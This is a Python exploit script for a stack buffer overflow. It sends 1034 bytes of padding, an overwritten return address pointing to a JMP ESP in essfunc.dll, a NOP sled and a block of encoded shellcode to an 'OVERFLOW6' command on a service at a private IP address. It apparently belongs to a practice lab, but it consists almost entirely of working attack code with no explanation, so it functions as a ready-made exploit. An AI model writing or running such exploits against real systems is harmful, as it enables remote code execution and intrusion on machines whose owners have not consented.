import socket
import sys
import time


print("[+] Nani???? Got shell!!\n")

buff = "A" * 1034

EIP = "\xeb\x11\x50\x62" # 0x625011EB JMP ESP essfunc.dll 

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xda\xc5\xb8\xec\xe8\x14\x6e\xd9\x74\x24\xf4"
shellcode += b"\x5f\x33\xc9\xb1\x52\x31\x47\x17\x03\x47\x17"
shellcode += b"\x83\x2b\xec\xf6\x9b\x4f\x05\x74\x63\xaf\xd6"
shellcode += b"\x19\xed\x4a\xe7\x19\x89\x1f\x58\xaa\xd9\x4d"
shellcode += b"\x55\x41\x8f\x65\xee\x27\x18\x8a\x47\x8d\x7e"
shellcode += b"\xa5\x58\xbe\x43\xa4\xda\xbd\x97\x06\xe2\x0d"
shellcode += b"\xea\x47\x23\x73\x07\x15\xfc\xff\xba\x89\x89"
shellcode += b"\x4a\x07\x22\xc1\x5b\x0f\xd7\x92\x5a\x3e\x46"
shellcode += b"\xa8\x04\xe0\x69\x7d\x3d\xa9\x71\x62\x78\x63"
shellcode += b"\x0a\x50\xf6\x72\xda\xa8\xf7\xd9\x23\x05\x0a"
shellcode += b"\x23\x64\xa2\xf5\x56\x9c\xd0\x88\x60\x5b\xaa"
shellcode += b"\x56\xe4\x7f\x0c\x1c\x5e\x5b\xac\xf1\x39\x28"
shellcode += b"\xa2\xbe\x4e\x76\xa7\x41\x82\x0d\xd3\xca\x25"
shellcode += b"\xc1\x55\x88\x01\xc5\x3e\x4a\x2b\x5c\x9b\x3d"
shellcode += b"\x54\xbe\x44\xe1\xf0\xb5\x69\xf6\x88\x94\xe5"
shellcode += b"\x3b\xa1\x26\xf6\x53\xb2\x55\xc4\xfc\x68\xf1"
shellcode += b"\x64\x74\xb7\x06\x8a\xaf\x0f\x98\x75\x50\x70"
shellcode += b"\xb1\xb1\x04\x20\xa9\x10\x25\xab\x29\x9c\xf0"
shellcode += b"\x7c\x79\x32\xab\x3c\x29\xf2\x1b\xd5\x23\xfd"
shellcode += b"\x44\xc5\x4c\xd7\xec\x6c\xb7\xb0\xd2\xd9\xb6"
shellcode += b"\xb1\xbb\x1b\xb8\x30\x87\x95\x5e\x58\xe7\xf3"
shellcode += b"\xc9\xf5\x9e\x59\x81\x64\x5e\x74\xec\xa7\xd4"
shellcode += b"\x7b\x11\x69\x1d\xf1\x01\x1e\xed\x4c\x7b\x89"
shellcode += b"\xf2\x7a\x13\x55\x60\xe1\xe3\x10\x99\xbe\xb4"
shellcode += b"\x75\x6f\xb7\x50\x68\xd6\x61\x46\x71\x8e\x4a"
shellcode += b"\xc2\xae\x73\x54\xcb\x23\xcf\x72\xdb\xfd\xd0"
shellcode += b"\x3e\x8f\x51\x87\xe8\x79\x14\x71\x5b\xd3\xce"
shellcode += b"\x2e\x35\xb3\x97\x1c\x86\xc5\x97\x48\x70\x29"
shellcode += b"\x29\x25\xc5\x56\x86\xa1\xc1\x2f\xfa\x51\x2d"
shellcode += b"\xfa\xbe\x72\xcc\x2e\xcb\x1a\x49\xbb\x76\x47"
shellcode += b"\x6a\x16\xb4\x7e\xe9\x92\x45\x85\xf1\xd7\x40"
shellcode += b"\xc1\xb5\x04\x39\x5a\x50\x2a\xee\x5b\x71"

payload = buff + EIP + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW6 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
